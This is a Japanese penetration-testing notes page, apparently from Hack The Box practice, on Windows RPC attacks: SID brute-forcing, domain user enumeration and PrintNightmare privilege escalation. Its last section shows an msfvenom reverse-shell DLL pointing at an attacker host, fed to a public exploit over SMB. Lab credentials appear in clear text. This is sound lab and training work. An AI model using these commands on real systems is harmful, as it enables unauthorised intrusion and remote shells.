# Attack
----

## SID Bruteforce
* セキュリティ識別子（SID）は`S-1-5-ドメイン識別子-相対識別子`で構成される
* ドメイン識別子は予め定められていないが、Administratorなどの一部の相対識別子は予め定められている
  * なお`S-1-5-21-ドメイン識別子-500`はAdministratorである
  * 詳細は[オペレーティング システムの既知のWindows識別子](https://docs.microsoft.com/ja-jp/troubleshoot/windows-server/identity/security-identifiers-in-windows)を参照
* rpcにアクセス可能な権限を有する時、`lookupnames`でドメイン識別子を取得可能
* `lookupsids`でSIDからユーザ名の取得が可能であるため、相対識別子の総当りを行うことで、該当のドメインのユーザを列挙可能
* 上記の相対識別子の総当りを自動化したimpacketのlookupsidsを利用可能
* HTB: Heist

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Heist]
  └──╼ $rpcclient -U hazard -h heist.htb
  Enter WORKGROUP\hazard's password:
  rpcclient $> lookupnames hazard
  hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1009
  S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1010
  S-1-5-21-4254423774-1266059056-3197185112-1010 *unknown*\*unknown* (8)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1011
  S-1-5-21-4254423774-1266059056-3197185112-1011 *unknown*\*unknown* (8)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1012
  S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1013
  S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)
  rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1014
  S-1-5-21-4254423774-1266059056-3197185112-1014 *unknown*\*unknown* (8)
  rpcclient $> ^C
  ┌─[✗]─[rio@parrot]─[~/Htb/Heist]
  └──╼ $impacket-lookupsid hazard:stealth1agent@heist.htb
  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
  
  [*] Brute forcing SIDs at heist.htb
  [*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
  [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
  500: SUPPORTDESK\Administrator (SidTypeUser)
  501: SUPPORTDESK\Guest (SidTypeUser)
  503: SUPPORTDESK\DefaultAccount (SidTypeUser)
  504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
  513: SUPPORTDESK\None (SidTypeGroup)
  1008: SUPPORTDESK\Hazard (SidTypeUser)
  1009: SUPPORTDESK\support (SidTypeUser)
  1012: SUPPORTDESK\Chase (SidTypeUser)
  1013: SUPPORTDESK\Jason (SidTypeUser)
  ```

##  enumdomusers
* enumdomusersを利用し、ドメインユーザを列挙可能
* HTB: Active

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Active]
  └──╼ $rpcclient -U svc_tgs -h active.htb
  Enter WORKGROUP\svc_tgs's password:
  rpcclient $> enumdomusers
  user:[Administrator] rid:[0x1f4]
  user:[Guest] rid:[0x1f5]
  user:[krbtgt] rid:[0x1f6]
  user:[SVC_TGS] rid:[0x44f]
  rpcclient $> ^C
  ```

## queryuser
* queryuserを利用し、ユーザのパスワード設定時刻を取得可能
* HTB: Active

  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Active]
  └──╼ $rpcclient -U svc_tgs -h active.htb
  Enter WORKGROUP\svc_tgs's password:
  rpcclient $> queryuser administrator
          User Name   :   Administrator
          Full Name   :
          Home Drive  :
          Dir Drive   :
          Profile Path:
          Logon Script:
          Description :   Built-in account for administering the computer/domain
          Workstations:
          Comment     :
          Remote Dial :
          Logon Time               :      金, 22  1月 2021 17:42:31 JST
          Logoff Time              :      木, 01  1月 1970 09:00:00 JST
          Kickoff Time             :      木, 01  1月 1970 09:00:00 JST
          Password last set Time   :      木, 19  7月 2018 04:06:40 JST
          Password can change Time :      金, 20  7月 2018 04:06:40 JST
          Password must change Time:      木, 14  9月 30828 11:48:05 JST
          unknown_2[0..31]...
          user_rid :      0x1f4
          group_rid:      0x201
          acb_info :      0x00000210
          fields_present: 0x00ffffff
          logon_divs:     168
          bad_password_count:     0x00000000
          logon_count:    0x00000023
          padding1[0..7]...
          logon_hrs[0..21]...
  rpcclient $> ^C
  ```

  ## PrintNightmare(CVE-2021-34527)
* rpcdumpでrpcでどのようなサービスが動作しているのか、調査可能
* PrintNightmareの可能性が存在するかどうかは、MS-RPRNが動作しているかどうかを調査すればよい
* [PrintNightmare exploit](https://github.com/cube0x0/CVE-2021-1675)
* Windows 7 <= Windows 10 21H1 && Windows Server 2008 <= Windows Server 2019
* 低権限のユーザアカウントを有する時、System権限を取得可能
* Htb: Atom

  ```console
  ┌─[rio@parrot]─[~/Htb/Atom]
  └──╼ $impacket-rpcdump @10.129.211.146 | grep -A8 MS-RPRN
  Protocol: [MS-RPRN]: Print System Remote Protocol
  Provider: spoolsv.exe
  UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
  Bindings:
            ncacn_ip_tcp:10.129.211.146[49668]
            ncalrpc:[LRPC-47371fd414b47e0f02]
  
  Protocol: N/A
  Provider: N/A
  ┌─[✗]─[rio@parrot]─[~/Htb/Atom/CVE-2021-1675]
  └──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f dll -o shell.dll
  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  [-] No arch selected, selecting arch: x64 from the payload
  No encoder specified, outputting raw payload
  Payload size: 460 bytes
  Final size of dll file: 8704 bytes
  Saved as: shell.dll
  ┌─[rio@parrot]─[~/Htb/Atom/CVE-2021-1675]
  └──╼ $python3 CVE-2021-1675.py atom/jason:kidvscat_electron_@123@10.129.211.146 '\\10.10.16.10\public\shell.dll'
  [*] Connecting to ncacn_np:10.129.211.146[\PIPE\spoolss]
  [+] Bind OK
  [+] pDriverPath Found C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
  [*] Executing \??\UNC\10.10.16.10\public\shell.dll
  [*] Try 1...
  [*] Stage0: 0
  [*] Try 2...
  [*] Stage0: 0
  ```
  
  
